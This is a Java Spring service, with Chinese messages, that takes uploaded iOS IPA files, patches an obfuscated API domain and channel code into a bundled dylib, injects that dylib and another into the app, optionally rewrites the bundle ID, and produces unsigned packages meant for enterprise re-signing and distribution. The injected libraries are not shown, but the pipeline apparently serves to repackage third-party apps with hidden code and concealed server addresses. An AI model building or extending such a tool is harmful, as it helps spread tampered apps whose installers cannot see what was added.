package com.admin.service;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.time.Duration;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;

import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.stereotype.Service;
import org.springframework.web.multipart.MultipartFile;

import com.admin.config.V26AdminProperties;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;

/**
 * IPA 上传 / 注入 / 任务状态。
 * GENERATE 依赖 macOS+Xcode，本服务只做明确拒绝。
 * INJECT：Java 编排 Redis 任务，调用 tools/static_link 下现有 CLI
 * （updateDylibUrlObf.py + injectDylib.py；域名混淆依赖 Unicorn）。
 */
@Slf4j
@Service
@RequiredArgsConstructor
public class IpaAdminService {

    private static final Duration JOB_TTL = Duration.ofHours(2);
    private static final int MAX_LOGS = 300;
    private static final Pattern SAFE_LOGO = Pattern.compile(
            "^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\\.(png|jpg|jpeg|webp)$",
            Pattern.CASE_INSENSITIVE);
    private static final Pattern SAFE_SOURCE = Pattern.compile(
            "^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\\.ipa$",
            Pattern.CASE_INSENSITIVE);
    private static final Pattern BUNDLE_RE = Pattern.compile(
            "^[A-Za-z][A-Za-z0-9-]*(\\.[A-Za-z][A-Za-z0-9-]*)+$");
    private static final Pattern SAFE_STEM = Pattern.compile("[^\\w.\\-+]+");

    private final V26AdminProperties props;
    private final StringRedisTemplate redis;

    public boolean generateEnabled() {
        return props.isIpaGenerateEnabled() && isMac();
    }

    public boolean injectEnabled() {
        return props.isIpaInjectEnabled();
    }

    public Map<String, Object> saveLogo(MultipartFile file) {
        Map<String, Object> data = new LinkedHashMap<>();
        if (file == null || file.isEmpty()) {
            data.put("ok", false);
            data.put("error", "请选择 Logo 文件");
            return data;
        }
        String orig = file.getOriginalFilename() == null ? "" : file.getOriginalFilename().toLowerCase(Locale.ROOT);
        if (!(orig.endsWith(".png") || orig.endsWith(".jpg") || orig.endsWith(".jpeg") || orig.endsWith(".webp"))) {
            data.put("ok", false);
            data.put("error", "Logo 仅支持 png/jpg/webp");
            return data;
        }
        if (file.getSize() > 5 * 1024 * 1024) {
            data.put("ok", false);
            data.put("error", "Logo 不能超过 5MB");
            return data;
        }
        try {
            String name = UUID.randomUUID() + ".png";
            Path dest = logosDir().resolve(name);
            Files.createDirectories(dest.getParent());
            Files.write(dest, file.getBytes());
            data.put("ok", true);
            data.put("filename", name);
            data.put("url", "/api/admin/apps/ipa/logo/" + name);
            return data;
        } catch (Exception e) {
            data.put("ok", false);
            data.put("error", "保存失败");
            return data;
        }
    }

    public Path resolveLogo(String filename) {
        if (filename == null || !SAFE_LOGO.matcher(filename).matches()) {
            return null;
        }
        Path p = logosDir().resolve(filename);
        return Files.isRegularFile(p) ? p : null;
    }

    public Map<String, Object> saveSource(MultipartFile file) {
        Map<String, Object> data = new LinkedHashMap<>();
        if (file == null || file.isEmpty()) {
            data.put("ok", false);
            data.put("error", "请选择源 IPA");
            return data;
        }
        String orig = file.getOriginalFilename() == null ? "source.ipa" : file.getOriginalFilename();
        if (!orig.toLowerCase(Locale.ROOT).endsWith(".ipa")) {
            data.put("ok", false);
            data.put("error", "仅支持 .ipa 文件");
            return data;
        }
        try {
            byte[] raw = file.getBytes();
            if (raw.length < 4 || raw[0] != 'P' || raw[1] != 'K') {
                data.put("ok", false);
                data.put("error", "文件不是有效的 IPA（zip）包");
                return data;
            }
            String name = UUID.randomUUID() + ".ipa";
            Path dest = sourcesDir().resolve(name);
            Files.createDirectories(dest.getParent());
            Files.write(dest, raw);
            data.put("ok", true);
            data.put("filename", name);
            data.put("originalName", orig);
            return data;
        } catch (Exception e) {
            data.put("ok", false);
            data.put("error", "保存失败");
            return data;
        }
    }

    public Map<String, Object> startGenerate(Map<String, Object> body) {
        if (!generateEnabled()) {
            return fail("当前环境未开放 GENERATE（需要 macOS + Xcode，且 v26.ipa-generate-enabled=true）");
        }
        return fail("IPA 网站封装 GENERATE 仍依赖 xcodebuild，请在 macOS 流水线外置完成（本服务已去掉 Python 入队）。");
    }

    public Map<String, Object> startInject(Map<String, Object> body) {
        if (!injectEnabled()) {
            return fail("当前环境未开放 INJECT（设置 v26.ipa-inject-enabled=true）");
        }
        String appid = str(body, "appid").trim().toLowerCase(Locale.ROOT);
        String apiUrl = str(body, "apiUrl");
        if (apiUrl.isBlank()) {
            apiUrl = str(body, "api_url");
        }
        apiUrl = apiUrl.trim();
        String sourceFilename = str(body, "sourceFilename");
        if (sourceFilename.isBlank()) {
            sourceFilename = str(body, "source_filename");
        }
        sourceFilename = sourceFilename.trim();
        String bundleId = str(body, "bundleId");
        if (bundleId.isBlank()) {
            bundleId = str(body, "bundle_id");
        }
        bundleId = bundleId.trim();
        String sourceOriginal = str(body, "sourceOriginalName");
        if (sourceOriginal.isBlank()) {
            sourceOriginal = str(body, "source_original_name");
        }

        String err = validateInject(appid, apiUrl, sourceFilename, bundleId);
        if (err != null) {
            return fail(err);
        }
        Path tools = toolsDir();
        if (tools == null || !Files.isDirectory(tools)) {
            return fail("未配置或找不到 IPA 工具目录（v26.ipa-tools-dir），应指向 26/tools/static_link");
        }
        Path dylibDir = tools.resolve("iOS26dylib");
        Path libAppcore = dylibDir.resolve("libappcore.dylib");
        Path libUtils = dylibDir.resolve("libutils.dylib");
        if (!Files.isRegularFile(libAppcore) || !Files.isRegularFile(libUtils)) {
            return fail("缺少注入 dylib：请将 libappcore.dylib / libutils.dylib 放到 "
                    + dylibDir.toAbsolutePath());
        }

        String jobId = UUID.randomUUID().toString().replace("-", "");
        JSONObject job = new JSONObject(true);
        job.put("jobId", jobId);
        job.put("status", "queued");
        job.put("ok", null);
        job.put("pct", 0);
        job.put("logs", new JSONArray(List.of("任务已创建，等待开始…")));
        job.put("message", "排队中");
        job.put("fileName", null);
        job.put("downloadPath", null);
        job.put("error", null);
        job.put("mode", "inject");
        job.put("appName", "");
        job.put("bundleId", bundleId);
        job.put("createdAt", System.currentTimeMillis() / 1000);
        try {
            writeJob(jobId, job);
        } catch (Exception e) {
            log.warn("ipa inject job create fail: {}", e.toString());
            return fail("无法写入任务状态（Redis）");
        }

        final String srcName = sourceFilename;
        final String api = apiUrl;
        final String aid = appid;
        final String bid = bundleId;
        final String origName = sourceOriginal;
        Thread t = new Thread(() -> runInject(jobId, srcName, api, aid, bid, origName),
                "ipa-inj-" + jobId.substring(0, 8));
        t.setDaemon(true);
        t.start();

        Map<String, Object> out = new LinkedHashMap<>();
        out.put("ok", true);
        out.put("jobId", jobId);
        return out;
    }

    private void runInject(String jobId, String sourceFilename, String apiUrl, String appid,
            String bundleId, String sourceOriginalName) {
        Path workRoot = null;
        Path src = null;
        try {
            updateJob(jobId, Map.of("status", "running", "pct", 2, "ok", null));
            appendLog(jobId, "开始 INJECT 注入…");

            src = sourcesDir().resolve(sourceFilename);
            if (!Files.isRegularFile(src) || !SAFE_SOURCE.matcher(sourceFilename).matches()) {
                throw new IllegalStateException("源 IPA 丢失，请重新上传");
            }
            progress(jobId, 12, "源 IPA：" + src.getFileName() + "（" + (Files.size(src) / 1024) + " KB）");
            appendLog(jobId, "源 IPA：" + src.getFileName() + "（" + (Files.size(src) / 1024) + " KB）");

            workRoot = workDir().resolve(jobId);
            deleteRecursive(workRoot);
            Files.createDirectories(workRoot);
            Path injectWork = workRoot.resolve("inject");
            Files.createDirectories(injectWork);

            String finalName = outputNameFromSource(sourceOriginalName, jobId);
            Path finalIpa = outputsDir().resolve(finalName);
            Files.createDirectories(finalIpa.getParent());
            appendLog(jobId, "输出命名：" + finalName);

            Path tools = toolsDir();
            Path dylibDir = tools.resolve("iOS26dylib");
            Path libUtilsSrc = dylibDir.resolve("libutils.dylib");
            Path libAppcore = dylibDir.resolve("libappcore.dylib");
            Path libUtilsWork = injectWork.resolve("libutils.dylib");
            Files.copy(libUtilsSrc, libUtilsWork, StandardCopyOption.REPLACE_EXISTING);

            progress(jobId, 25, "patch libutils 域名/渠道码…");
            appendLog(jobId, "patch libutils 域名/渠道码…");
            String python = props.getIpaPython() == null || props.getIpaPython().isBlank()
                    ? "python" : props.getIpaPython().trim();
            Path patchScript = tools.resolve("updateDylibUrlObf.py");
            Path injectScript = tools.resolve("injectDylib.py");
            if (!Files.isRegularFile(patchScript) || !Files.isRegularFile(injectScript)) {
                throw new IllegalStateException("工具脚本缺失：" + tools);
            }

            List<String> patchCmd = new ArrayList<>();
            patchCmd.add(python);
            patchCmd.add(patchScript.toAbsolutePath().toString());
            if (apiUrl != null && !apiUrl.isBlank()) {
                patchCmd.add("--url");
                patchCmd.add(apiUrl);
            }
            patchCmd.add("--appid");
            patchCmd.add(appid);
            patchCmd.add(libUtilsWork.toAbsolutePath().toString());
            runProcess(jobId, patchCmd, tools, 10 * 60);

            progress(jobId, 55, "注入 dylib 到 IPA…");
            appendLog(jobId, "注入 dylib 到 IPA…");
            if (bundleId != null && !bundleId.isBlank()) {
                appendLog(jobId, "将改写 Bundle ID → " + bundleId);
            } else {
                appendLog(jobId, "保留源包 Bundle ID");
            }
            List<String> injCmd = new ArrayList<>();
            injCmd.add(python);
            injCmd.add(injectScript.toAbsolutePath().toString());
            injCmd.add(src.toAbsolutePath().toString());
            if (bundleId != null && !bundleId.isBlank()) {
                injCmd.add(bundleId);
            } else {
                injCmd.add("");
            }
            injCmd.add("--out");
            injCmd.add(finalIpa.toAbsolutePath().toString());
            injCmd.add("--dylib");
            injCmd.add(libAppcore.toAbsolutePath().toString());
            injCmd.add("--dylib");
            injCmd.add(libUtilsWork.toAbsolutePath().toString());
            runProcess(jobId, injCmd, tools, 30 * 60);

            if (!Files.isRegularFile(finalIpa)) {
                throw new IllegalStateException("注入结束但未找到输出文件");
            }
            updateJob(jobId, Map.of(
                    "status", "done",
                    "ok", true,
                    "pct", 100,
                    "fileName", finalName,
                    "downloadPath", finalName,
                    "error", null,
                    "message", "注入完成"));
            appendLog(jobId, "完成：" + finalName);
            appendLog(jobId, "说明：未签名 IPA，请用企业证书手动重签后再分发。");
        } catch (Exception e) {
            log.warn("ipa inject failed job={}: {}", jobId.substring(0, Math.min(12, jobId.length())), e.toString());
            updateJob(jobId, Map.of(
                    "status", "error",
                    "ok", false,
                    "pct", 100,
                    "error", trimErr(e.getMessage()),
                    "message", "注入失败"));
            appendLog(jobId, "失败：" + e.getMessage());
        } finally {
            if (workRoot != null) {
                deleteRecursive(workRoot);
            }
            if (src != null) {
                try {
                    Files.deleteIfExists(src);
                } catch (Exception ignored) {
                }
            }
        }
    }

    private void runProcess(String jobId, List<String> cmd, Path cwd, int timeoutSec) throws Exception {
        appendLog(jobId, "$ " + String.join(" ", cmd));
        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.directory(cwd.toFile());
        pb.redirectErrorStream(true);
        Process p = pb.start();
        try (BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8))) {
            String line;
            while ((line = br.readLine()) != null) {
                appendLog(jobId, line);
                JSONObject cur = readJobRaw(jobId);
                int pct = cur == null ? 30 : Math.min(92, Math.max(28, cur.getIntValue("pct") + 2));
                progress(jobId, pct, line);
            }
        }
        boolean finished = p.waitFor(timeoutSec, TimeUnit.SECONDS);
        if (!finished) {
            p.destroyForcibly();
            throw new IllegalStateException("工具超时（" + timeoutSec + "s）");
        }
        int code = p.exitValue();
        if (code != 0) {
            throw new IllegalStateException("工具退出码 " + code + "（需本机 Python + unicorn，且 dylib 模板可用）");
        }
    }

    private String validateInject(String appid, String apiUrl, String sourceFilename, String bundleId) {
        if (appid == null || appid.isBlank()) {
            return "缺少 AppID";
        }
        if (apiUrl == null || apiUrl.isBlank()) {
            return "请填写 API 域名";
        }
        String low = apiUrl.toLowerCase(Locale.ROOT);
        if (!(low.startsWith("http://") || low.startsWith("https://")) || !apiUrl.contains("://")) {
            return "API 域名须为 http(s) URL";
        }
        try {
            java.net.URI u = java.net.URI.create(apiUrl);
            if (u.getHost() == null || u.getHost().isBlank()) {
                return "API 域名须为 http(s) URL";
            }
        } catch (Exception e) {
            return "API 域名须为 http(s) URL";
        }
        if (apiUrl.length() != 20) {
            return "API 域名须恰好 20 字符（当前 " + apiUrl.length() + "），例：https://w2.vsdeg.com";
        }
        if (bundleId != null && !bundleId.isBlank()
                && (!BUNDLE_RE.matcher(bundleId).matches() || bundleId.length() > 128)) {
            return "Bundle ID 格式无效（如 com.company.app）；留空则保留原包名";
        }
        if (sourceFilename == null || sourceFilename.isBlank() || !SAFE_SOURCE.matcher(sourceFilename).matches()) {
            return "请先上传源 IPA";
        }
        if (!Files.isRegularFile(sourcesDir().resolve(sourceFilename))) {
            return "源 IPA 不存在，请重新上传";
        }
        return null;
    }

    private String outputNameFromSource(String originalName, String jobId) {
        String raw = originalName == null ? "" : Paths.get(originalName.trim()).getFileName().toString();
        if (raw.toLowerCase(Locale.ROOT).endsWith(".ipa")) {
            raw = raw.substring(0, raw.length() - 4);
        }
        String stem = SAFE_STEM.matcher(raw).replaceAll("_").replaceAll("^[._-]+|[._-]+$", "");
        if (stem.isBlank()) {
            stem = "source";
        }
        if (stem.length() > 80) {
            stem = stem.substring(0, 80);
        }
        String finalName = stem + "_inject.ipa";
        Path dest = outputsDir().resolve(finalName);
        if (Files.exists(dest) && jobId != null && jobId.length() >= 8) {
            finalName = stem + "_inject-" + jobId.substring(0, 8) + ".ipa";
        }
        return finalName;
    }

    public Map<String, Object> job(String jobId) {
        Map<String, Object> data = loadJob(jobId);
        Object rawJob = data.get("job");
        if (rawJob instanceof Map) {
            @SuppressWarnings("unchecked")
            Map<String, Object> job = new LinkedHashMap<>((Map<String, Object>) rawJob);
            String status = String.valueOf(job.getOrDefault("status", ""));
            Object fileName = job.get("fileName");
            if ("done".equals(status) && fileName != null && !String.valueOf(fileName).isBlank()) {
                job.put("downloadUrl", "/api/admin/apps/ipa/download/job/" + (jobId == null ? "" : jobId.trim()));
            } else {
                job.put("downloadUrl", null);
            }
            data.put("job", job);
        }
        return data;
    }

    public Path resolveJobOutput(String jobId) {
        Map<String, Object> data = loadJob(jobId);
        Object rawJob = data.get("job");
        if (!(rawJob instanceof Map)) {
            return null;
        }
        Object fileName = ((Map<?, ?>) rawJob).get("fileName");
        return resolveOutput(fileName == null ? null : String.valueOf(fileName));
    }

    private Map<String, Object> loadJob(String jobId) {
        JSONObject job = readJobRaw(jobId);
        if (job == null) {
            return fail("任务不存在或已过期");
        }
        Map<String, Object> data = new LinkedHashMap<>();
        data.put("ok", true);
        data.put("job", job);
        return data;
    }

    private JSONObject readJobRaw(String jobId) {
        String raw = redis.opsForValue().get(jobKey(jobId));
        if (raw == null || raw.isBlank()) {
            return null;
        }
        return JSON.parseObject(raw);
    }

    private void writeJob(String jobId, JSONObject job) {
        redis.opsForValue().set(jobKey(jobId), job.toJSONString(), JOB_TTL);
    }

    private void updateJob(String jobId, Map<String, Object> fields) {
        JSONObject job = readJobRaw(jobId);
        if (job == null) {
            return;
        }
        for (Map.Entry<String, Object> e : fields.entrySet()) {
            job.put(e.getKey(), e.getValue());
        }
        writeJob(jobId, job);
    }

    private void appendLog(String jobId, String line) {
        if (line == null || line.isBlank()) {
            return;
        }
        JSONObject job = readJobRaw(jobId);
        if (job == null) {
            return;
        }
        JSONArray logs = job.getJSONArray("logs");
        if (logs == null) {
            logs = new JSONArray();
        }
        logs.add(line.length() > 2000 ? line.substring(0, 2000) : line);
        while (logs.size() > MAX_LOGS) {
            logs.remove(0);
        }
        job.put("logs", logs);
        writeJob(jobId, job);
    }

    private void progress(String jobId, int pct, String message) {
        Map<String, Object> m = new LinkedHashMap<>();
        m.put("pct", pct);
        if (message != null && !message.isBlank()) {
            m.put("message", message.length() > 200 ? message.substring(0, 200) : message);
        }
        updateJob(jobId, m);
    }

    public Path resolveOutput(String filename) {
        String name = filename == null ? "" : filename.trim();
        if (name.isEmpty() || name.contains("/") || name.contains("\\") || name.contains("..")) {
            return null;
        }
        Path p = outputsDir().resolve(name);
        return Files.isRegularFile(p) ? p : null;
    }

    private Path assetsRoot() {
        Path upload = Paths.get(props.getUploadDir() == null ? "D:/v26_records/uploads" : props.getUploadDir());
        return upload.toAbsolutePath().getParent().resolve("ipa-assets");
    }

    private Path logosDir() {
        return assetsRoot().resolve("logos");
    }

    private Path sourcesDir() {
        return assetsRoot().resolve("sources");
    }

    private Path outputsDir() {
        return assetsRoot().resolve("outputs");
    }

    private Path workDir() {
        return assetsRoot().resolve("work");
    }

    private Path toolsDir() {
        String configured = props.getIpaToolsDir();
        if (configured != null && !configured.isBlank()) {
            return Paths.get(configured.trim()).toAbsolutePath().normalize();
        }
        // 默认：相对本机 26 仓库 tools/static_link
        Path guess = Paths.get("D:/workTwo/ios/26/tools/static_link");
        return Files.isDirectory(guess) ? guess : null;
    }

    private static String jobKey(String jobId) {
        return "ipa:job:" + (jobId == null ? "" : jobId.trim());
    }

    private static String str(Map<String, Object> body, String key) {
        if (body == null || body.get(key) == null) {
            return "";
        }
        return String.valueOf(body.get(key));
    }

    private static String trimErr(String msg) {
        if (msg == null || msg.isBlank()) {
            return "inject failed";
        }
        return msg.length() > 500 ? msg.substring(0, 500) : msg;
    }

    private static void deleteRecursive(Path root) {
        if (root == null || !Files.exists(root)) {
            return;
        }
        try {
            Files.walk(root)
                    .sorted((a, b) -> b.compareTo(a))
                    .forEach(p -> {
                        try {
                            Files.deleteIfExists(p);
                        } catch (Exception ignored) {
                        }
                    });
        } catch (Exception ignored) {
        }
    }

    private static boolean isMac() {
        String os = System.getProperty("os.name", "").toLowerCase(Locale.ROOT);
        return os.contains("mac");
    }

    private Map<String, Object> fail(String error) {
        Map<String, Object> m = new LinkedHashMap<>();
        m.put("ok", false);
        m.put("error", error);
        return m;
    }
}
